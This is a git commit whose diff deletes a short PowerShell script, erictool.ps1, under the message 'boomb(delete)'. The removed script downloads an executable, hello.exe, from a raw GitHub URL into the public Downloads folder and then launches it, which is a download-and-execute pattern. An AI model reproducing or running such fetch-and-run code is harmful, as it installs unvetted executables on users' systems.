ab96dde6bdf777d2a9ed3935001ba02dd518ebf9
Eric970619 <115120630+Eric970619@users.noreply.github.com>
2024-09-02 23:30:32 +0800

    boomb(delete): erictool.ps1

--- erictool.ps1
+++
@@ -1,9 +0,0 @@
-$downloadUrl = "https://raw.githubusercontent.com/Eric970619/page/main/hello.exe"
-$destinationPath = "C:\Users\Public\Downloads\hello.exe"
-
-Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
-
-while (-not (Test-Path $destinationPath)) {
-    Start-Sleep -Seconds 1
-}
-Start-Process -FilePath $destinationPath
